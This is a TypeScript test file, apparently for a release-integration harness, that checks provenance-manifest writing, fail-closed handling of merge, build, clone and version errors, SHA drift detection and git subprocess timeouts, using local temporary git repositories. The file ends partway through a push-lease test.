import type {ConflictResolverResult} from './conflict-resolver.js'
import type {IntegrationAdapters, ProvenanceManifest} from './integrate.js'
import {execFileSync} from 'node:child_process'
import crypto from 'node:crypto'
import fs from 'node:fs/promises'
import os from 'node:os'
import path from 'node:path'
import {describe, expect, it} from 'vitest'
import {
  makeRealAdapters,
  readProvenanceManifest,
  runIntegration,
  TRUSTED_PUSH_LEASE_REJECTED_ERROR_NAME,
  writeProvenanceManifest,
} from './integrate.js'
import * as integrateModule from './integrate.js'

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

async function makeTmpDir(): Promise<string> {
  return fs.mkdtemp(path.join(os.tmpdir(), 'harness-test-'))
}

function makeAdapters(overrides: Partial<IntegrationAdapters> = {}): IntegrationAdapters {
  const sourceSha = 'a'.repeat(40)
  return {
    cloneRepo: async () => {},
    fetchTags: async () => {},
    fetchRef: async () => {},
    resolveRefSha: async () => sourceSha,
    captureRefSha: async () => sourceSha,
    createBranch: async () => {},
    mergeRef: async () => ({kind: 'clean'}),
    runMerge: async () => {},
    assertNoUnmerged: async () => {},
    resetToBase: async () => {},
    stripWorkflowFiles: async () => {},
    commitIntegration: async () => {},
    buildCli: async () => {},
    verifyVersion: async () => {},
    getCommitSha: async () => 'abc1234deadbeef',
    validateFinalTree: async () => {},
    prepareTrustedPushRepository: async () => ({
      workDir: 'trusted-push-repository',
      integrationCommit: 'abc1234deadbeef',
      cleanup: async () => {},
    }),
    acquirePushCredential: async () => ({token: 'test-token'}),
    pushIntegration: async () => {},
    ...overrides,
  }
}

function runGit(workDir: string, args: readonly string[]): string {
  return execFileSync('git', args, {cwd: workDir, encoding: 'utf8'}).trim()
}

function setEnvironmentValue(key: string, value: string | undefined): void {
  if (value === undefined) delete process.env[key]
  else process.env[key] = value
}

async function withEnvironment<T>(
  values: Readonly<Record<string, string | undefined>>,
  callback: () => Promise<T>,
): Promise<T> {
  const previous = new Map<string, string | undefined>()
  for (const key of Object.keys(values)) previous.set(key, process.env[key])
  try {
    for (const [key, value] of Object.entries(values)) setEnvironmentValue(key, value)
    return await callback()
  } finally {
    for (const [key, value] of previous) setEnvironmentValue(key, value)
  }
}

async function makeGitUrlWrapper(targetUrl: string, remoteDir: string): Promise<string> {
  const wrapperPath = path.join(await makeTmpDir(), 'git-wrapper.mjs')
  await fs.writeFile(
    wrapperPath,
    String.raw`#!/usr/bin/env node
import {appendFileSync} from 'node:fs'
import {spawnSync} from 'node:child_process'

const args = process.argv.slice(2)
const logPath = process.env.TEST_GIT_LOG
if (logPath !== undefined) appendFileSync(logPath, JSON.stringify(args) + '\n')

if (args.includes('push') && process.env.TEST_MOVE_SHA !== undefined) {
  const update = spawnSync('git', ['--git-dir', ${JSON.stringify(remoteDir)}, 'update-ref', process.env.TEST_MOVE_REF ?? '', process.env.TEST_MOVE_SHA], {
    encoding: 'utf8',
  })
  if (update.status !== 0) {
    process.stderr.write(update.stderr ?? '')
    process.exit(update.status ?? 1)
  }
}

const rewritten = args.map(arg => (arg === ${JSON.stringify(targetUrl)} ? ${JSON.stringify(remoteDir)} : arg))
const result = spawnSync('git', rewritten, {stdio: 'inherit'})
if (result.error !== undefined) {
  process.stderr.write(String(result.error))
  process.exit(1)
}
process.exit(result.status ?? 1)
`,
    {encoding: 'utf8', mode: 0o700},
  )
  return wrapperPath
}

async function makeGitSourceRepository(): Promise<{
  readonly dir: string
  readonly firstSha: string
  readonly headSha: string
}> {
  const dir = await makeTmpDir()
  runGit(dir, ['init', '--quiet'])
  runGit(dir, ['config', 'user.name', 'harness-test'])
  runGit(dir, ['config', 'user.email', 'harness-test@example.invalid'])
  await fs.writeFile(path.join(dir, 'file.txt'), 'first\n', 'utf8')
  runGit(dir, ['add', 'file.txt'])
  runGit(dir, ['commit', '--quiet', '-m', 'first'])
  const firstSha = runGit(dir, ['rev-parse', 'HEAD'])
  await fs.writeFile(path.join(dir, 'file.txt'), 'second\n', 'utf8')
  runGit(dir, ['commit', '--quiet', '-am', 'second'])
  const headSha = runGit(dir, ['rev-parse', 'HEAD'])
  return {dir, firstSha, headSha}
}

// ---------------------------------------------------------------------------
// Provenance round-trip
// ---------------------------------------------------------------------------

describe('writeProvenanceManifest / readProvenanceManifest', () => {
  it('provenance round-trip: writeProvenanceManifest → readProvenanceManifest', async () => {
    // #given
    const dir = await makeTmpDir()
    try {
      const manifest: ProvenanceManifest = {
        baseVersion: '1.15.13',
        carryManifest: {
          base: 'v1.15.13',
          carries: [
            {
              ref: 'https://github.com/anomalyco/opencode/pull/30182',
              resolvedSha: 'd'.repeat(40),
            },
          ],
        },
        integrationRefs: [
          {
            ref: 'https://github.com/anomalyco/opencode/pull/30182',
            resolvedSha: 'deadbeef1234',
            reason: 'Signed Anthropic thinking during reorder — merged to dev, not in 1.15.13 tag',
            upstreamStatus: 'merged-to-dev',
          },
        ],
        integrationCommit: 'abc1234deadbeef',
        buildSha: 'dev',
      }

      // #when
      await writeProvenanceManifest(dir, manifest)
      const read = await readProvenanceManifest(dir)

      // #then
      expect(read).toEqual(manifest)
    } finally {
      await fs.rm(dir, {recursive: true, force: true})
    }
  })

  it('returns null when manifest does not exist', async () => {
    // #given
    const dir = await makeTmpDir()
    try {
      // #when
      const result = await readProvenanceManifest(dir)

      // #then
      expect(result).toBeNull()
    } finally {
      await fs.rm(dir, {recursive: true, force: true})
    }
  })
})

// ---------------------------------------------------------------------------
// Empty ref set → base-only provenance
// ---------------------------------------------------------------------------

describe('runIntegration', () => {
  it('empty refs → base-only provenance, no merge called', async () => {
    // #given
    const dir = await makeTmpDir()
    let mergeCalled = false
    try {
      const adapters = makeAdapters({
        runMerge: async () => {
          mergeCalled = true
        },
      })

      // #when
      const result = await runIntegration(
        {
          baseVersion: '1.15.13',
          releaseRepo: 'anomalyco/opencode',
          integrationRefs: [],
          agent: 'build',
          model: 'anthropic/claude-sonnet-4-6',
          opencodeBin: 'opencode',
          workDir: dir,
          promptPath: path.join(dir, 'prompt.txt'),
        },
        adapters,
      )

      // #then
      expect(result.ok).toBe(true)
      expect(mergeCalled).toBe(false)
      // Narrow via assertion — avoids conditional expect
      if (!result.ok) throw new Error(`expected ok, got error: ${result.error}`)
      expect(result.manifest.baseVersion).toBe('1.15.13')
      expect(result.manifest.integrationRefs.length).toBe(0)
      expect(typeof result.manifest.integrationCommit).toBe('string')
    } finally {
      await fs.rm(dir, {recursive: true, force: true})
    }
  })

  it('records the carry SHA rather than the final integration commit', async () => {
    // #given
    const dir = await makeTmpDir()
    const carrySha = 'b'.repeat(40)
    const integrationCommit = 'c'.repeat(40)
    try {
      const result = await runIntegration(
        {
          baseVersion: '1.15.13',
          releaseRepo: 'anomalyco/opencode',
          integrationRefs: ['https://github.com/anomalyco/opencode/pull/30182'],
          workDir: dir,
        },
        makeAdapters({
          resolveRefSha: async () => carrySha,
          captureRefSha: async () => carrySha,
          getCommitSha: async () => integrationCommit,
        }),
      )

      // #when
      // The pipeline has already completed with the resolved carry.

      // #then
      expect(result.ok).toBe(true)
      if (result.ok === false) throw new Error(result.error)
      if (result.manifest.carryManifest === undefined) throw new Error('expected carry manifest')
      expect(result.manifest.carryManifest.carries[0]?.resolvedSha).toBe(carrySha)
      expect(result.manifest.integrationRefs[0]?.resolvedSha).toBe(carrySha)
      expect(result.manifest.integrationRefs[0]?.resolvedSha).not.toBe(integrationCommit)
    } finally {
      await fs.rm(dir, {recursive: true, force: true})
    }
  })

  it('fails closed with CarrySourceChangedError when the moving head changes before fetch completes', async () => {
    // #given
    const dir = await makeTmpDir()
    const resolvedSha = 'd'.repeat(40)
    const movedSha = 'e'.repeat(40)
    try {
      const result = await runIntegration(
        {
          baseVersion: '1.15.13',
          releaseRepo: 'anomalyco/opencode',
          integrationRefs: ['https://github.com/anomalyco/opencode/pull/30182'],
          workDir: dir,
        },
        makeAdapters({
          resolveRefSha: async () => resolvedSha,
          captureRefSha: async () => movedSha,
        }),
      )

      // #when
      // The fetched source resolves to a different SHA than the frozen manifest.

      // #then
      expect(result.ok).toBe(false)
      if (result.ok === true) throw new Error('expected source drift failure')
      expect(result.error).toMatch(/CarrySourceChangedError/)
      expect(await readProvenanceManifest(dir)).toBeNull()
    } finally {
      await fs.rm(dir, {recursive: true, force: true})
    }
  })

  it('passes one supplied carry manifest unchanged to the integration consumer', async () => {
    // #given
    const dir = await makeTmpDir()
    const carrySha = 'f'.repeat(40)
    const carryManifest = {
      base: 'v1.15.13',
      carries: [{ref: 'https://github.com/anomalyco/opencode/pull/30182', resolvedSha: carrySha}],
    } as const
    const fetched: string[] = []
    try {
      const result = await runIntegration(
        {
          baseVersion: '1.15.13',
          releaseRepo: 'anomalyco/opencode',
          integrationRefs: [carryManifest.carries[0].ref],
          carryManifest,
          workDir: dir,
        },
        makeAdapters({
          resolveRefSha: async () => {
            throw new Error('supplied manifest must be consumed without re-resolution')
          },
          fetchRef: async (_workDir, _remoteUrl, _fetchRef, _localRef, expectedSha) => {
            fetched.push(expectedSha ?? '')
          },
          captureRefSha: async () => carrySha,
        }),
      )

      // #when
      // The same manifest is supplied to the trusted integration consumer.

      // #then
      expect(result.ok).toBe(true)
      if (result.ok === false) throw new Error(result.error)
      expect(result.manifest.carryManifest).toEqual(carryManifest)
      expect(fetched).toEqual([carrySha])
    } finally {
      await fs.rm(dir, {recursive: true, force: true})
    }
  })

  // ---------------------------------------------------------------------------
  // Fail-hard contract: merge failure
  // ---------------------------------------------------------------------------

  it('fail-hard: merge failure → non-zero result, nothing frozen', async () => {
    // #given
    const dir = await makeTmpDir()
    try {
      await fs.writeFile(
        path.join(dir, 'prompt.txt'),
        'dummy {{tag}} {{branch}} {{merges}} {{sources}} {{repo}} {{version}} {{channel}} {{base}} {{release_repo}} {{release_url}} {{branches}}',
      )
      const adapters = makeAdapters({
        mergeRef: async () => {
          throw new Error('deterministic merge left unresolved conflicts in packages/opencode/src/session/prompt.ts')
        },
      })

      // #when
      const result = await runIntegration(
        {
          baseVersion: '1.15.13',
          releaseRepo: 'anomalyco/opencode',
          integrationRefs: ['https://github.com/anomalyco/opencode/pull/30182'],
          agent: 'build',
          model: 'anthropic/claude-sonnet-4-6',
          opencodeBin: 'opencode',
          workDir: dir,
          promptPath: path.join(dir, 'prompt.txt'),
        },
        adapters,
      )

      // #then
      expect(result.ok).toBe(false)
      // Nothing frozen: no manifest written
      const manifest = await readProvenanceManifest(dir)
      expect(manifest).toBeNull()
      // Narrow via assertion — avoids conditional expect
      if (result.ok) throw new Error('expected failure result')
      expect(result.error).toMatch(/merge|unresolved/)
    } finally {
      await fs.rm(dir, {recursive: true, force: true})
    }
  })

  // ---------------------------------------------------------------------------
  // Fail-hard contract: build failure
  // ---------------------------------------------------------------------------

  it('fail-hard: build failure → non-zero result, nothing frozen', async () => {
    // #given
    const dir = await makeTmpDir()
    try {
      await fs.writeFile(
        path.join(dir, 'prompt.txt'),
        'dummy {{tag}} {{branch}} {{merges}} {{sources}} {{repo}} {{version}} {{channel}} {{base}} {{release_repo}} {{release_url}} {{branches}}',
      )
      const adapters = makeAdapters({
        buildCli: async () => {
          throw new Error('bun run build exited with code 1')
        },
      })

      // #when
      const result = await runIntegration(
        {
          baseVersion: '1.15.13',
          releaseRepo: 'anomalyco/opencode',
          integrationRefs: ['https://github.com/anomalyco/opencode/pull/30182'],
          agent: 'build',
          model: 'anthropic/claude-sonnet-4-6',
          opencodeBin: 'opencode',
          workDir: dir,
          promptPath: path.join(dir, 'prompt.txt'),
        },
        adapters,
      )

      // #then
      expect(result.ok).toBe(false)
      const manifest = await readProvenanceManifest(dir)
      expect(manifest).toBeNull()
      // Narrow via assertion — avoids conditional expect
      if (result.ok) throw new Error('expected failure result')
      expect(result.error).toMatch(/build|bun/)
    } finally {
      await fs.rm(dir, {recursive: true, force: true})
    }
  })

  // ---------------------------------------------------------------------------
  // Fail-hard contract: version mismatch
  // ---------------------------------------------------------------------------

  it('fail-hard: version mismatch → non-zero result, nothing frozen', async () => {
    // #given
    const dir = await makeTmpDir()
    try {
      await fs.writeFile(
        path.join(dir, 'prompt.txt'),
        'dummy {{tag}} {{branch}} {{merges}} {{sources}} {{repo}} {{version}} {{channel}} {{base}} {{release_repo}} {{release_url}} {{branches}}',
      )
      const adapters = makeAdapters({
        verifyVersion: async () => {
          throw new Error('Built CLI reported version 1.15.12, expected 1.15.13')
        },
      })

      // #when
      const result = await runIntegration(
        {
          baseVersion: '1.15.13',
          releaseRepo: 'anomalyco/opencode',
          integrationRefs: ['https://github.com/anomalyco/opencode/pull/30182'],
          agent: 'build',
          model: 'anthropic/claude-sonnet-4-6',
          opencodeBin: 'opencode',
          workDir: dir,
          promptPath: path.join(dir, 'prompt.txt'),
        },
        adapters,
      )

      // #then
      expect(result.ok).toBe(false)
      const manifest = await readProvenanceManifest(dir)
      expect(manifest).toBeNull()
      // Narrow via assertion — avoids conditional expect
      if (result.ok) throw new Error('expected failure result')
      expect(result.error).toMatch(/version|mismatch/)
    } finally {
      await fs.rm(dir, {recursive: true, force: true})
    }
  })

  // ---------------------------------------------------------------------------
  // Fail-hard contract: clone failure
  // ---------------------------------------------------------------------------

  it('fail-hard: clone failure → non-zero result, nothing frozen', async () => {
    // #given
    const dir = await makeTmpDir()
    try {
      const adapters = makeAdapters({
        cloneRepo: async () => {
          throw new Error('git clone failed: repository not found')
        },
      })

      // #when
      const result = await runIntegration(
        {
          baseVersion: '1.15.13',
          releaseRepo: 'anomalyco/opencode',
          integrationRefs: ['https://github.com/anomalyco/opencode/pull/30182'],
          agent: 'build',
          model: 'anthropic/claude-sonnet-4-6',
          opencodeBin: 'opencode',
          workDir: dir,
          promptPath: path.join(dir, 'prompt.txt'),
        },
        adapters,
      )

      // #then
      expect(result.ok).toBe(false)
      const manifest = await readProvenanceManifest(dir)
      expect(manifest).toBeNull()
      // Narrow via assertion — avoids conditional expect
      if (result.ok) throw new Error('expected failure result')
      expect(result.error.length).toBeGreaterThan(0)
    } finally {
      await fs.rm(dir, {recursive: true, force: true})
    }
  })

  it('returns a named deadline failure when the integration pipeline exceeds its configured bound', async () => {
    // #given a local integration run whose clone stage never completes
    const dir = await makeTmpDir()
    try {
      const resultPromise = runIntegration(
        {
          baseVersion: '1.15.13',
          releaseRepo: 'anomalyco/opencode',
          integrationRefs: [],
          workDir: dir,
          pipelineTimeoutMs: 20,
        },
        makeAdapters({
          cloneRepo: async () => new Promise<void>(() => {}),
          dispose: async () => new Promise<void>(() => {}),
        }),
      )

      // #when the driver deadline expires during clone
      const result = await resultPromise

      // #then the failure names both the deadline and the active stage
      expect(result.ok).toBe(false)
      if (result.ok) throw new Error('expected deadline failure')
      expect(result.stage).toBe('deadline')
      expect(result.error).toMatch(/integration pipeline deadline exceeded during clone/)
    } finally {
      await fs.rm(dir, {recursive: true, force: true})
    }
  })

  it('reports a named timeout when a git subprocess exceeds its bound', async () => {
    // #given a local repository and a local git shim that deliberately stalls
    const dir = await makeTmpDir()
    const sourceRepo = path.join(dir, 'source.git')
    const gitShim = path.join(dir, 'git-stall.sh')
    try {
      execFileSync('git', ['init', '--bare', sourceRepo], {encoding: 'utf8'})
      await fs.writeFile(gitShim, '#!/bin/sh\nsleep 1\n', {encoding: 'utf8', mode: 0o700})
      const adapters = makeRealAdapters({hooksRoot: dir, gitBin: gitShim, gitTimeoutMs: 20})

      // #when a local clone invokes the stalled git subprocess
      const clone = adapters.cloneRepo(`file://${sourceRepo}`, path.join(dir, 'clone'))

      // #then the timeout is attributable to the git subprocess rather than generic
      let caughtError: unknown
      try {
        await clone
      } catch (error) {
        caughtError = error
      }
      expect(caughtError).toBeInstanceOf(Error)
      if (!(caughtError instanceof Error)) throw new Error('expected git timeout error')
      expect(caughtError.name).toBe('GitSubprocessTimeoutError')
      expect(caughtError.message).toMatch(/git subprocess timed out after 20ms/)
      await adapters.dispose?.()
    } finally {
      await fs.rm(dir, {recursive: true, force: true})
    }
  })

  // ---------------------------------------------------------------------------
  // Happy path: successful integration with refs
  // ---------------------------------------------------------------------------

  it('happy path: successful integration writes provenance manifest', async () => {
    // #given
    const dir = await makeTmpDir()
    try {
      // Write a dummy prompt.txt so render doesn't fail
      await fs.writeFile(
        path.join(dir, 'prompt.txt'),
        'dummy prompt {{tag}} {{branch}} {{merges}} {{sources}} {{repo}} {{version}} {{channel}} {{base}} {{release_repo}} {{release_url}} {{branches}}',
      )
      const adapters = makeAdapters({
        getCommitSha: async () => 'cafebabe1234',
      })

      // #when
      const result = await runIntegration(
        {
          baseVersion: '1.15.13',
          releaseRepo: 'anomalyco/opencode',
          integrationRefs: ['https://github.com/anomalyco/opencode/pull/30182'],
          agent: 'build',
          model: 'anthropic/claude-sonnet-4-6',
          opencodeBin: 'opencode',
          workDir: dir,
          promptPath: path.join(dir, 'prompt.txt'),
        },
        adapters,
      )

      // #then
      expect(result.ok).toBe(true)
      // Narrow via assertion — avoids conditional expect
      if (!result.ok) throw new Error(`expected ok, got error: ${result.error}`)
      expect(result.manifest.baseVersion).toBe('1.15.13')
      expect(result.manifest.integrationRefs.length).toBe(1)
      const [firstRef] = result.manifest.integrationRefs
      expect(firstRef?.ref).toBe('https://github.com/anomalyco/opencode/pull/30182')
      expect(result.manifest.integrationCommit).toBe('cafebabe1234')
      // Manifest is persisted
      const persisted = await readProvenanceManifest(dir)
      expect(persisted).toEqual(result.manifest)
    } finally {
      await fs.rm(dir, {recursive: true, force: true})
    }
  })

  // ---------------------------------------------------------------------------
  // U5: reset, strip, and commit are ordered after deterministic merge
  // ---------------------------------------------------------------------------

  it('deterministic merge is followed by reset, workflow strip, commit, and HEAD capture', async () => {
    // #given
    const dir = await makeTmpDir()
    try {
      await fs.writeFile(
        path.join(dir, 'prompt.txt'),
        'dummy {{tag}} {{branch}} {{merges}} {{sources}} {{repo}} {{version}} {{channel}} {{base}} {{release_repo}} {{release_url}} {{branches}}',
      )
      const callOrder: string[] = []
      const adapters = makeAdapters({
        mergeRef: async () => {
          callOrder.push('mergeRef')
          return {kind: 'clean'}
        },
        resetToBase: async () => {
          callOrder.push('resetToBase')
        },
        stripWorkflowFiles: async () => {
          callOrder.push('stripWorkflowFiles')
        },
        commitIntegration: async () => {
          callOrder.push('commitIntegration')
        },
        getCommitSha: async () => {
          callOrder.push('getCommitSha')
          return 'cafebabe5678'
        },
      })

      // #when
      const result = await runIntegration(
        {
          baseVersion: '1.15.13',
          releaseRepo: 'anomalyco/opencode',
          integrationRefs: ['https://github.com/anomalyco/opencode/pull/30182'],
          agent: 'build',
          model: 'anthropic/claude-sonnet-4-6',
          opencodeBin: 'opencode',
          workDir: dir,
          promptPath: path.join(dir, 'prompt.txt'),
        },
        adapters,
      )

      // #then
      expect(result.ok).toBe(true)
      // commitIntegration must come after deterministic merge + strip and before final getCommitSha
      const mergeIdx = callOrder.indexOf('mergeRef')
      const resetIdx = callOrder.indexOf('resetToBase')
      const stripIdx = callOrder.indexOf('stripWorkflowFiles')
      const commitIdx = callOrder.indexOf('commitIntegration')
      const shaIdx = callOrder.lastIndexOf('getCommitSha')
      expect(mergeIdx).toBeGreaterThanOrEqual(0)
      expect(resetIdx).toBeGreaterThan(mergeIdx)
      expect(stripIdx).toBeGreaterThan(resetIdx)
      expect(commitIdx).toBeGreaterThan(mergeIdx)
      expect(commitIdx).toBeGreaterThan(stripIdx)
      expect(shaIdx).toBeGreaterThan(commitIdx)
    } finally {
      await fs.rm(dir, {recursive: true, force: true})
    }
  })

  it('fix 1: commitIntegration is NOT called when sources is empty', async () => {
    // #given
    const dir = await makeTmpDir()
    let commitCalled = false
    try {
      const adapters = makeAdapters({
        commitIntegration: async () => {
          commitCalled = true
        },
      })

      // #when
      const result = await runIntegration(
        {
          baseVersion: '1.15.13',
          releaseRepo: 'anomalyco/opencode',
          integrationRefs: [],
          agent: 'build',
          model: 'anthropic/claude-sonnet-4-6',
          opencodeBin: 'opencode',
          workDir: dir,
          promptPath: path.join(dir, 'prompt.txt'),
        },
        adapters,
      )

      // #then
      expect(result.ok).toBe(true)
      expect(commitCalled).toBe(false)
    } finally {
      await fs.rm(dir, {recursive: true, force: true})
    }
  })

  it('fix 1: fail-hard when commitIntegration fails', async () => {
    // #given
    const dir = await makeTmpDir()
    try {
      await fs.writeFile(
        path.join(dir, 'prompt.txt'),
        'dummy {{tag}} {{branch}} {{merges}} {{sources}} {{repo}} {{version}} {{channel}} {{base}} {{release_repo}} {{release_url}} {{branches}}',
      )
      const adapters = makeAdapters({
        commitIntegration: async () => {
          throw new Error('git commit failed: nothing to commit')
        },
      })

      // #when
      const result = await runIntegration(
        {
          baseVersion: '1.15.13',
          releaseRepo: 'anomalyco/opencode',
          integrationRefs: ['https://github.com/anomalyco/opencode/pull/30182'],
          agent: 'build',
          model: 'anthropic/claude-sonnet-4-6',
          opencodeBin: 'opencode',
          workDir: dir,
          promptPath: path.join(dir, 'prompt.txt'),
        },
        adapters,
      )

      // #then
      expect(result.ok).toBe(false)
      const manifest = await readProvenanceManifest(dir)
      expect(manifest).toBeNull()
      if (result.ok) throw new Error('expected failure result')
      expect(result.error).toMatch(/commit/i)
    } finally {
      await fs.rm(dir, {recursive: true, force: true})
    }
  })

  // ---------------------------------------------------------------------------
  // Provenance manifest matches what getProvenance() would read (single source of truth)
  // ---------------------------------------------------------------------------

  it('provenance single source of truth: manifest content matches getProvenance shape', async () => {
    // #given
    const dir = await makeTmpDir()
    try {
      const manifest: ProvenanceManifest = {
        baseVersion: '1.15.13',
        carryManifest: {
          base: 'v1.15.13',
          carries: [
            {
              ref: 'https://github.com/anomalyco/opencode/pull/30182',
              resolvedSha: 'd'.repeat(40),
            },
          ],
        },
        integrationRefs: [
          {
            ref: 'https://github.com/anomalyco/opencode/pull/30182',
            resolvedSha: 'deadbeef',
            reason: 'test',
            upstreamStatus: 'merged-to-dev',
          },
        ],
        integrationCommit: 'abc123',
        buildSha: 'dev',
      }

      // #when
      await writeProvenanceManifest(dir, manifest)
      const read = await readProvenanceManifest(dir)

      // #then — shape must match the ProvenanceManifest interface fields
      expect(read).not.toBeNull()
      // Narrow via assertion — avoids conditional expect
      if (read === null) throw new Error('expected non-null manifest')
      expect('baseVersion' in read).toBe(true)
      expect('integrationRefs' in read).toBe(true)
      expect('integrationCommit' in read).toBe(true)
      expect('buildSha' in read).toBe(true)
      expect(read.baseVersion).toBe('1.15.13')
      expect(read.integrationCommit).toBe('abc123')
      const [firstIntegrationRef] = read.integrationRefs
      expect(firstIntegrationRef?.ref).toBe('https://github.com/anomalyco/opencode/pull/30182')
    } finally {
      await fs.rm(dir, {recursive: true, force: true})
    }
  })

  // ---------------------------------------------------------------------------
  // Per-ref provenance SHA
  // ---------------------------------------------------------------------------

  it('per-ref SHA: 3 refs → 3 distinct resolvedSha values in manifest', async () => {
    // #given
    const dir = await makeTmpDir()
    try {
      await fs.writeFile(
        path.join(dir, 'prompt.txt'),
        'dummy {{tag}} {{branch}} {{merges}} {{sources}} {{repo}} {{version}} {{channel}} {{base}} {{release_repo}} {{release_url}} {{branches}}',
      )
      // Each ref gets a distinct SHA from captureRefSha
      const refShas = ['a'.repeat(40), 'b'.repeat(40), 'c'.repeat(40)]
      let resolveCallCount = 0
      let captureCallCount = 0
      const adapters = makeAdapters({
        resolveRefSha: async () => {
          const sha = refShas[resolveCallCount] ?? ''
          resolveCallCount++
          return sha
        },
        captureRefSha: async () => {
          const sha = refShas[captureCallCount] ?? null
          captureCallCount++
          return sha
        },
        getCommitSha: async () => 'integrationCommitSha',
      })

      // #when
      const result = await runIntegration(
        {
          baseVersion: '1.15.13',
          releaseRepo: 'anomalyco/opencode',
          integrationRefs: [
            'https://github.com/anomalyco/opencode/pull/1',
            'https://github.com/anomalyco/opencode/pull/2',
            'https://github.com/anomalyco/opencode/pull/3',
          ],
          agent: 'build',
          model: 'anthropic/claude-sonnet-4-6',
          opencodeBin: 'opencode',
          workDir: dir,
          promptPath: path.join(dir, 'prompt.txt'),
        },
        adapters,
      )

      // #then
      expect(result.ok).toBe(true)
      if (!result.ok) throw new Error(`expected ok, got error: ${result.error}`)
      expect(result.manifest.integrationRefs.length).toBe(3)
      const shas = result.manifest.integrationRefs.map(r => r.resolvedSha)
      // All 3 are distinct
      expect(new Set(shas).size).toBe(3)
      // Each matches the captured SHA, not the integration commit
      expect(shas[0]).toBe('a'.repeat(40))
      expect(shas[1]).toBe('b'.repeat(40))
      expect(shas[2]).toBe('c'.repeat(40))
    } finally {
      await fs.rm(dir, {recursive: true, force: true})
    }
  })

  it('per-ref SHA: empty carry set → no captureRefSha called, manifest integrationRefs empty', async () => {
    // #given
    const dir = await makeTmpDir()
    let captureCallCount = 0
    try {
      const adapters = makeAdapters({
        captureRefSha: async () => {
          captureCallCount++
          return 'should-not-be-called'
        },
        getCommitSha: async () => 'integrationCommitSha',
      })

      // #when
      const result = await runIntegration(
        {
          baseVersion: '1.15.13',
          releaseRepo: 'anomalyco/opencode',
          integrationRefs: [],
          agent: 'build',
          model: 'anthropic/claude-sonnet-4-6',
          opencodeBin: 'opencode',
          workDir: dir,
          promptPath: path.join(dir, 'prompt.txt'),
        },
        adapters,
      )

      // #then
      expect(result.ok).toBe(true)
      expect(captureCallCount).toBe(0)
      if (!result.ok) throw new Error(`expected ok, got error: ${result.error}`)
      expect(result.manifest.integrationRefs.length).toBe(0)
    } finally {
      await fs.rm(dir, {recursive: true, force: true})
    }
  })

  it('per-ref SHA: captureRefSha failure → fails before freezing provenance', async () => {
    // #given
    const dir = await makeTmpDir()
    try {
      await fs.writeFile(
        path.join(dir, 'prompt.txt'),
        'dummy {{tag}} {{branch}} {{merges}} {{sources}} {{repo}} {{version}} {{channel}} {{base}} {{release_repo}} {{release_url}} {{branches}}',
      )
      const integrationCommit = 'fallbackCommitSha'
      const adapters = makeAdapters({
        // captureRefSha returns null (failure) for all refs
        captureRefSha: async () => null,
        getCommitSha: async () => integrationCommit,
      })

      // #when
      const result = await runIntegration(
        {
          baseVersion: '1.15.13',
          releaseRepo: 'anomalyco/opencode',
          integrationRefs: ['https://github.com/anomalyco/opencode/pull/1'],
          agent: 'build',
          model: 'anthropic/claude-sonnet-4-6',
          opencodeBin: 'opencode',
          workDir: dir,
          promptPath: path.join(dir, 'prompt.txt'),
        },
        adapters,
      )

      // #then — an absent resolved source SHA is not publishable provenance
      expect(result.ok).toBe(false)
      if (result.ok) throw new Error('expected failure result')
      expect(result.error).toMatch(/SHA|provenance/i)
      expect(await readProvenanceManifest(dir)).toBeNull()
    } finally {
      await fs.rm(dir, {recursive: true, force: true})
    }
  })
})

// ---------------------------------------------------------------------------
// Clean-snapshot guarantee tests
// ---------------------------------------------------------------------------

describe('clean-snapshot guarantees', () => {
  it('source-tree mode: --source-tree against a non-git dir builds without invoking clone path', async () => {
    // #given — this invariant is already covered by build-platform.test.ts
    // "bypasses cloneAndCheckout when --source-tree is supplied and dir is valid"
    // We assert here that the adapter contract is correct: when sources.length === 0,
    // cloneRepo is never called.
    const dir = await makeTmpDir()
    let cloneCalled = false
    try {
      const adapters = makeAdapters({
        cloneRepo: async () => {
          cloneCalled = true
        },
      })

      // #when — empty refs (no merge needed, no clone of source refs)
      const result = await runIntegration(
        {
          baseVersion: '1.15.13',
          releaseRepo: 'anomalyco/opencode',
          integrationRefs: [],
          agent: 'build',
          model: 'anthropic/claude-sonnet-4-6',
          opencodeBin: 'opencode',
          workDir: dir,
          promptPath: path.join(dir, 'prompt.txt'),
        },
        adapters,
      )

      // #then — cloneRepo IS called (it clones the release repo, not the source tree)
      // but runMerge is NOT called (no refs to merge)
      expect(result.ok).toBe(true)
      // cloneRepo is always called (clones the release repo); the invariant is that
      // runMerge (the LLM merge) is not called when there are no refs.
      // The source-tree bypass is at the build-platform level, not runIntegration.
      expect(cloneCalled).toBe(true)
    } finally {
      await fs.rm(dir, {recursive: true, force: true})
    }
  })
})

describe('frozen carry fetches', () => {
  it('detects a local branch move between SHA resolution and fetch without network access', async () => {
    // #given
    const sourceDir = await makeTmpDir()
    const workDir = await makeTmpDir()
    const adapters = integrateModule.makeRealAdapters()
    try {
      runGit(sourceDir, ['init', '--quiet'])
      runGit(sourceDir, ['config', 'user.name', 'harness-test'])
      runGit(sourceDir, ['config', 'user.email', 'harness-test@example.invalid'])
      await fs.writeFile(path.join(sourceDir, 'carry.txt'), 'first\n', 'utf8')
      runGit(sourceDir, ['add', 'carry.txt'])
      runGit(sourceDir, ['commit', '--quiet', '-m', 'carry'])
      const resolvedSha = runGit(sourceDir, ['rev-parse', 'HEAD'])

      runGit(sourceDir, ['checkout', '--quiet', '-b', 'carry'])
      await fs.writeFile(path.join(sourceDir, 'carry.txt'), 'moved\n', 'utf8')
      runGit(sourceDir, ['commit', '--quiet', '-am', 'move carry'])
      runGit(workDir, ['init', '--quiet'])

      // #when / #then
      await expect(
        adapters.fetchRef(workDir, sourceDir, 'refs/heads/carry', 'refs/remotes/watch/local/carry', resolvedSha),
      ).rejects.toMatchObject({name: 'CarrySourceChangedError'})
    } finally {
      await adapters.dispose?.()
      await fs.rm(sourceDir, {recursive: true, force: true})
      await fs.rm(workDir, {recursive: true, force: true})
    }
  })
})

describe('trusted integration push leases', () => {
  it('pushes when the remote ref matches the lease expectation', async () => {
    // #given
    const source = await makeGitSourceRepository()
    const remoteDir = await makeTmpDir()
    const logPath = path.join(await makeTmpDir(), 'git-args.log')
    const targetUrl = 'https://local.test/fro-bot/agent.git'
    const targetRef = 'refs/harness-integrate/test'
    runGit(remoteDir, ['init', '--bare', '--quiet'])
    runGit(source.dir, ['push', '--quiet', remoteDir, `${source.firstSha}:${targetRef}`])
    runGit(source.dir, ['push', '--quiet', remoteDir, `${source.headSha}:refs/hidden/source`])
    const gitBin = await makeGitUrlWrapper(targetUrl, remoteDir)
